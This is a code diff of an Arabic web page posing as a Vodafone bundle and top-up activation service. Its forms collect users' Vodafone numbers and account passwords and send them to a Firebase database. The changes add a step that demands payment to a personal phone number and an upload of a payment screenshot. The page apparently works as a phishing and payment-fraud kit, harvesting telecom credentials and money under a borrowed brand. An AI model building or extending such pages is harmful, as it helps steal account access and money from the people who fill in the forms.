@@ -8,6 +8,7 @@
   <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
 
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
@@ -24,6 +25,8 @@
 
     .container {
       padding: 30px 15px;
+      max-width: 480px;
+      margin: auto;
     }
 
     h1 {
@@ -42,7 +45,7 @@
       border: 1px solid #ff3333;
       border-radius: 14px;
       padding: 20px;
-      margin-bottom: 20px;
+      margin-bottom: 30px;
       box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
       transition: transform 0.3s ease;
     }
@@ -56,7 +59,7 @@
       color: #ffbdbd;
     }
 
-    input {
+    input, label {
       display: block;
       width: 90%;
       margin: 10px auto;
@@ -64,6 +67,14 @@
       border-radius: 10px;
       border: none;
       font-size: 14px;
+      background: #330000;
+      color: white;
+      text-align: center;
+    }
+
+    input[type="file"] {
+      padding: 5px;
+      text-align: left;
     }
 
     .btn {
@@ -116,6 +127,16 @@
       margin-top: 5px;
       font-size: 13px;
     }
+
+    .payment-note {
+      font-size: 14px;
+      margin-bottom: 10px;
+      color: #ffdddd;
+      background: #660000;
+      border-radius: 10px;
+      padding: 10px;
+      line-height: 1.4;
+    }
   </style>
 </head>
 <body>
@@ -123,13 +144,18 @@
     <h1>تفعيل باقات فودافون</h1>
     <p class="subtitle">أقوى العروض بأقل الأسعار</p>
 
+    <div class="payment-note">
+      يرجى الدفع أولاً على الرقم <strong>01013091169</strong> ثم رفع صورة إثبات الدفع (سكرين شوت) مع بيانات التفعيل.
+    </div>
+
     <!-- فليكس 13000 -->
     <div class="box">
       <h2>فليكس 13000 - 240 جنيه</h2>
       <div class="conditions">شروط: لا يوجد سلف أو نوتة - التفعيل خلال ساعتين</div>
       <input type="text" placeholder="رقم فودافون" id="num1" />
       <input type="password" placeholder="كلمة المرور" id="pass1" />
-      <div class="btn" onclick="sendData('فليكس 13000 - 240 جنيه', 'num1', 'pass1')">تفعيل الآن</div>
+      <input type="file" id="screen1" accept="image/*" />
+      <div class="btn" onclick="sendData('فليكس 13000 - 240 جنيه', 'num1', 'pass1', 'screen1')">تفعيل الآن</div>
     </div>
 
     <!-- 40 جيجا -->
@@ -138,7 +164,8 @@
       <div class="conditions">شروط: التفعيل حتى لو عليك سلف أو نوتة - خلال 72 ساعة</div>
       <input type="text" placeholder="رقم فودافون" id="num2" />
       <input type="password" placeholder="كلمة المرور" id="pass2" />
-      <div class="btn" onclick="sendData('40 جيجا - 330 جنيه', 'num2', 'pass2')">تفعيل الآن</div>
+      <input type="file" id="screen2" accept="image/*" />
+      <div class="btn" onclick="sendData('40 جيجا - 330 جنيه', 'num2', 'pass2', 'screen2')">تفعيل الآن</div>
     </div>
 
     <!-- شحن رصيد صافي -->
@@ -149,6 +176,7 @@
       <input type="password" placeholder="كلمة المرور" id="pass3" />
       <input type="number" placeholder="اكتب الرصيد المطلوب بالجنيه" id="amount" oninput="calculatePrice()" />
       <div id="priceDisplay" class="price-display">السعر بالجنيه: 0</div>
+      <input type="file" id="screen3" accept="image/*" />
       <div class="btn" onclick="sendCustomBalance()">شحن الآن</div>
     </div>
 
@@ -172,26 +200,72 @@
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    const storage = firebase.storage();
 
-    function sendData(packageName, numId, passId) {
+    function showSuccessPopup() {
+      const popup = document.getElementById("successPopup");
+      popup.style.display = "block";
+      setTimeout(() => {
+        popup.style.display = "none";
+      }, 2500);
+    }
+
+    function uploadImageAndGetURL(file, path) {
+      return new Promise((resolve, reject) => {
+        if (!file) {
+          reject("يرجى رفع صورة إثبات الدفع.");
+          return;
+        }
+        const storageRef = storage.ref(path);
+        const uploadTask = storageRef.put(file);
+
+        uploadTask.on('state_changed', 
+          null, 
+          error => reject(error.message), 
+          () => {
+            uploadTask.snapshot.ref.getDownloadURL().then(url => resolve(url));
+          });
+      });
+    }
+
+    async function sendData(packageName, numId, passId, screenId) {
       const num = document.getElementById(numId).value.trim();
       const pass = document.getElementById(passId).value.trim();
+      const screenInput = document.getElementById(screenId);
+      const file = screenInput.files[0];
 
-      if (num && pass) {
-        db.ref("voda").push({
+      if (!num || !pass) {
+        alert("يرجى إدخال الرقم وكلمة المرور.");
+        return;
+      }
+      if (!file) {
+        alert("يرجى رفع صورة إثبات الدفع.");
+        return;
+      }
+
+      try {
+        // رفع الصورة
+        const imgPath = `screenshots/${num}_${Date.now()}`;
+        const imageURL = await uploadImageAndGetURL(file, imgPath);
+
+        // حفظ البيانات مع رابط الصورة
+        await db.ref("voda").push({
           num: num,
           pass: pass,
           pack: packageName,
-          time: new Date().toLocaleString()
-        }).then(() => {
-          showSuccessPopup();
-          document.getElementById(numId).value = "";
-          document.getElementById(passId).value = "";
-        }).catch((error) => {
-          alert("خطأ أثناء الإرسال: " + error.message);
+          time: new Date().toLocaleString(),
+          paymentScreenshot: imageURL,
+          senderNumber: "01013091169"
         });
-      } else {
-        alert("يرجى إدخال الرقم وكلمة المرور.");
+
+        showSuccessPopup();
+
+        // مسح الحقول
+        document.getElementById(numId).value = "";
+        document.getElementById(passId).value = "";
+        screenInput.value = "";
+      } catch (error) {
+        alert("خطأ أثناء الإرسال: " + error);
       }
     }
 
@@ -202,38 +276,47 @@
       return price;
     }
 
-    function sendCustomBalance() {
+    async function sendCustomBalance() {
       const num = document.getElementById("num3").value.trim();
       const pass = document.getElementById("pass3").value.trim();
       const amount = document.getElementById("amount").value.trim();
+      const screenInput = document.getElementById("screen3");
+      const file = screenInput.files[0];
 
-      if (num && pass && amount) {
+      if (!num || !pass || !amount) {
+        alert("يرجى إدخال جميع البيانات.");
+        return;
+      }
+      if (!file) {
+        alert("يرجى رفع صورة إثبات الدفع.");
+        return;
+      }
+
+      try {
         const price = calculatePrice();
-        db.ref("voda").push({
+        const imgPath = `screenshots/${num}_${Date.now()}`;
+        const imageURL = await uploadImageAndGetURL(file, imgPath);
+
+        await db.ref("voda").push({
           num: num,
           pass: pass,
           pack: `شحن رصيد ${amount} جنيه (بسعر ${price} جنيه)`,
-          time: new Date().toLocaleString()
-        }).then(() => {
-          showSuccessPopup();
-          document.getElementById("num3").value = "";
-          document.getElementById("pass3").value = "";
-          document.getElementById("amount").value = "";
-          document.getElementById("priceDisplay").innerText = "السعر بالجنيه: 0";
-        }).catch((error) => {
-          alert("حدث خطأ: " + error.message);
+          time: new Date().toLocaleString(),
+          paymentScreenshot: imageURL,
+          senderNumber: "01013091169"
         });
-      } else {
-        alert("يرجى إدخال جميع البيانات.");
-      }
-    }
 
-    function showSuccessPopup() {
-      const popup = document.getElementById("successPopup");
-      popup.style.display = "block";
-      setTimeout(() => {
-        popup.style.display = "none";
-      }, 2000);
+        showSuccessPopup();
+
+        document.getElementById("num3").value = "";
+        document.getElementById("pass3").value = "";
+        document.getElementById("amount").value = "";
+        document.getElementById("priceDisplay").innerText = "السعر بالجنيه: 0";
+        screenInput.value = "";
+
+      } catch (error) {
+        alert("خطأ أثناء الإرسال: " + error);
+      }
     }
   </script>
 </body>
